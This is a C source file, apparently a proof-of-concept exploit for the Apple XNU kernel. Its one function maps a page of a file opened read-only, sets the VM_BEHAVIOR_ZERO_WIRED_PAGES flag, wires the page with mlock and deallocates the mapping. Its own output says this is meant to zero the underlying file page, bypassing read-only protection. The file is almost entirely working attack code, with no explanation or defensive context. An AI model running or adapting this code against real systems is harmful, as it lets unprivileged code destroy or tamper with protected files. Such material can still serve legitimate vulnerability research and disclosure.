//
//  XNUVulnerability.c
//  XNUVuln
//
//  Created by 이지안 on 5/9/25.
//

#include "XNUVulnerability.h"
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach/mach.h>
#include "mach_vm.h"
#include <errno.h>

long g_page_size = 0;

void ensure_page_size_known() {
    if (g_page_size == 0) {
        g_page_size = sysconf(_SC_PAGESIZE);
        if (g_page_size == -1) {
            perror("sysconf(_SC_PAGESIZE) failed");
            g_page_size = 16384;
        }
        printf("XNUVulnerability: Determined page size to be %ld bytes.\n", g_page_size);
    }
}


int zero_out_file_page(const char *filePath, off_t offset_in_file) {
    ensure_page_size_known();
    kern_return_t kr;
    int fd = -1;
    void *mapped_at = MAP_FAILED;

    fd = open(filePath, O_RDONLY);
    if (fd == -1) {
        perror("open failed");
        return 1;
    }

    off_t page_aligned_offset = (offset_in_file / g_page_size) * g_page_size;

    mapped_at = mmap(0, g_page_size, PROT_READ, MAP_FILE | MAP_SHARED, fd, page_aligned_offset);
    if (mapped_at == MAP_FAILED) {
        perror("mmap failed");
        close(fd);
        return 2;
    }
    printf("Mapped file page for '%s' at offset %lld (aligned %lld) to 0x%llx\n",
           filePath, (long long)offset_in_file, (long long)page_aligned_offset, (uint64_t)mapped_at);

    kr = mach_vm_behavior_set(mach_task_self(),
                              (mach_vm_address_t)mapped_at,
                              g_page_size,
                              VM_BEHAVIOR_ZERO_WIRED_PAGES);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES: %s\n", mach_error_string(kr));
        munmap(mapped_at, g_page_size);
        close(fd);
        return 3;
    }
    printf("Set VM_BEHAVIOR_ZERO_WIRED_PAGES\n");

    int mlock_err = mlock(mapped_at, g_page_size);
    if (mlock_err != 0) {
        perror("mlock failed");
        mach_vm_behavior_set(mach_task_self(), (mach_vm_address_t)mapped_at, g_page_size, VM_BEHAVIOR_DEFAULT);
        munmap(mapped_at, g_page_size);
        close(fd);
        return 4;
    }
    printf("mlock success\n");

    kr = mach_vm_deallocate(mach_task_self(),
                            (mach_vm_address_t)mapped_at,
                            g_page_size);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "vm_deallocate failed: %s\n", mach_error_string(kr));
        munlock(mapped_at, g_page_size);
        mach_vm_behavior_set(mach_task_self(), (mach_vm_address_t)mapped_at, g_page_size, VM_BEHAVIOR_DEFAULT);
        munmap(mapped_at, g_page_size);
        close(fd);
        return 5;
    }
    printf("Deallocated map entries for page from '%s'. The underlying file page (offset %lld) should now be zeroed.\n", filePath, (long long)page_aligned_offset);

    close(fd);
    return 0; 
}
